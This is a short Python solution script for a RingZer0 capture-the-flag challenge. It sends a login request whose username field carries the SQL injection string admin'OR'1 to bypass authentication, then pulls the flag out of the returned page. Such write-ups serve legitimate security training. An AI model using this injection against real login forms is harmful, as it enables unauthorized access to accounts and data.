#!/usr/bin/python

# User     : ltcastelnuovo
# Challenge: https://ringzer0ctf.com/challenges/3

import requests

CHALLENGE_PORT = 10003


def submit_payload(payload):
    response = requests.post(
        f"http://challenges.ringzer0team.com:{CHALLENGE_PORT}", data=payload
    ).text

    flag = (
        response.split('<div class="alert alert-info">')[1].split("</div>")[0].strip()
    )

    print("\n" + flag)
    exit()


def main():
    payload = {
        "username": "admin'OR'1",
        "password": "password",
    }

    submit_payload(payload)


if __name__ == "__main__":
    main()
